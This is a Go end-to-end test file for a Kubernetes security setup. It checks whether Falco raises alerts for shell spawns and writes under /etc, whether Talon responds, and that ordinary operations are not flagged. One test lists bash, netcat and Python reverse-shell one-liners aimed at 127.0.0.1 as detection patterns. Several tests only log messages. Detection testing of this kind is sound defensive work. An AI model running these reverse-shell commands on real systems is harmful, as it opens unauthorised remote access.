package e2e

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/hexstrike/hexstrike-defense/tests/e2e/framework"
)

// TestFalcoDetection_ShellSpawn tests that shell spawning triggers alerts
func TestFalcoDetection_ShellSpawn(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	// Get Kubernetes client
	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("Shell spawn is detected by Falco", func(t *testing.T) {
		// List pods in namespace
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found in hexstrike-agents namespace")
		}

		// Get pod that can be used for testing
		testPod := pods[0]

		// Execute a shell command in the pod
		stdout, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "echo 'test shell spawn'"},
		)

		if err != nil {
			t.Logf("Exec error (may be expected): %v", err)
			t.Logf("Stdout: %s, Stderr: %s", stdout, stderr)
		}

		// Give Falco time to process the event
		time.Sleep(5 * time.Second)

		// Check if Falco alerts were generated
		// In a real test, you would check Falco's output (Fluentd, stdout, etc.)
		t.Log("Shell spawn detected - check Falco logs for alert")
	})

	t.Run("Reverse shell patterns are detected", func(t *testing.T) {
		// Test for common reverse shell patterns
		patterns := []struct {
			name    string
			command string
		}{
			{
				name:    "bash reverse shell",
				command: "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1",
			},
			{
				name:    "netcat reverse shell",
				command: "nc -e /bin/sh 127.0.0.1 8080",
			},
			{
				name:    "python reverse shell",
				command: "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"127.0.0.1\",8080));subprocess.call([\"/bin/sh\",\"-i\"])'",
			},
		}

		for _, pattern := range patterns {
			t.Run(pattern.name, func(t *testing.T) {
				// In a real test, execute the command and verify Falco alert
				t.Logf("Testing pattern: %s", pattern.command)
				// The actual detection would be verified through Falco logs
			})
		}
	})
}

// TestFalcoDetection_EtcWrite tests that /etc writes trigger alerts
func TestFalcoDetection_EtcWrite(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("Write to /etc triggers alert", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Attempt to write to /etc
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "echo 'test' > /etc/test_write"},
		)

		// Command might fail due to permissions (expected in secured environment)
		if err != nil {
			t.Logf("Write blocked (expected): %v", err)
		}
		if stderr != "" {
			t.Logf("Stderr: %s", stderr)
		}

		// Give Falco time to process
		time.Sleep(5 * time.Second)

		t.Log("Write to /etc processed - check Falco logs for alert")
	})

	t.Run("Write to /passwd triggers high-priority alert", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Attempt to modify passwd file
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "touch /etc/passwd_test"},
		)

		if err != nil {
			t.Logf("Write blocked (expected): %v", err)
		}
		t.Logf("Stderr: %s", stderr)

		time.Sleep(5 * time.Second)
		t.Log("Passwd modification attempt processed")
	})
}

// TestFalcoDetection_TalonResponse tests that Talon terminates compromised pods
func TestFalcoDetection_TalonResponse(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	t.Run("Talon webhook is configured", func(t *testing.T) {
		// Check if Talon deployment exists
		// In a real test, verify Talon is running and configured
		t.Log("Verifying Talon webhook configuration")

		// This would check:
		// 1. Talon deployment exists
		// 2. Webhook is registered with Kubernetes
		// 3. Falco is configured to send events to Talon
	})

	t.Run("CRITICAL alerts trigger pod termination", func(t *testing.T) {
		// Create a test pod that will trigger Falco alerts
		// In production, this would be done through a separate test namespace

		// Test procedure:
		// 1. Create isolated test pod
		// 2. Execute shell spawn command
		// 3. Wait for Talon to respond (< 200ms target)
		// 4. Verify pod was terminated

		t.Log("Pod termination test - requires controlled environment")
		t.Skip("Skipping destructive test in CI")
	})

	t.Run("WARNING alerts trigger pod quarantine", func(t *testing.T) {
		// WARNING level alerts should:
		// 1. Add quarantine labels
		// 2. Scale deployment to 0
		// 3. Create audit event

		t.Log("Pod quarantine test - requires controlled environment")
		t.Skip("Skipping destructive test in CI")
	})
}

// TestFalcoDetection_FalsePositives tests that legitimate operations aren't blocked
func TestFalcoDetection_FalsePositives(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("Legitimate file operations are allowed", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Read operations should be allowed
		stdout, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"cat", "/etc/hostname"},
		)

		if err != nil {
			t.Errorf("Legitimate read failed: %v", err)
		}
		if stderr != "" && !strings.Contains(stderr, "Permission denied") {
			t.Logf("Stderr: %s", stderr)
		}
		t.Logf("Read output: %s", stdout)
	})

	t.Run("Legitimate shell for maintenance is allowed", func(t *testing.T) {
		// Maintenance windows should allow shell access
		// This would be configured in Falco rules

		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Execute a simple command
		stdout, _, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"ls", "-la"},
		)

		if err != nil {
			t.Logf("Command failed: %v", err)
		}
		t.Logf("Command output: %s", stdout)
	})

	t.Run("Application writes to /tmp are allowed", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Write to /tmp should be allowed
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "echo 'test' > /tmp/hexstrike_test"},
		)

		if err != nil {
			t.Logf("Write to /tmp failed: %v", err)
		}
		if stderr != "" {
			t.Logf("Stderr: %s", stderr)
		}
	})
}

// TestFalcoDetection_FalcoRulesValidation validates Falco rules are loaded
func TestFalcoDetection_FalcoRulesValidation(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	t.Run("Hexstrike Falco rules are loaded", func(t *testing.T) {
		// Verify Falco is running with our custom rules
		// This would check:
		// 1. Falco pod exists
		// 2. Rules are loaded (via Falco API or logs)

		t.Log("Falco rules validation - check Falco logs for rule loading")
	})

	t.Run("Talon configuration is valid", func(t *testing.T) {
		// Verify Talon ConfigMap exists and is valid YAML
		t.Log("Talon configuration validation")
	})
}

// getFalcoLogs retrieves Falco logs from a pod
func getFalcoLogs(ctx context.Context, k8sClient *framework.Client, namespace string) (string, error) {
	// Get Falco pod
	pods, err := k8sClient.ListPods(ctx, namespace)
	if err != nil {
		return "", err
	}

	for _, pod := range pods {
		if strings.Contains(pod.Name, "falco") {
			return k8sClient.GetPodLogs(ctx, namespace, pod.Name, "falco")
		}
	}

	return "", nil
}
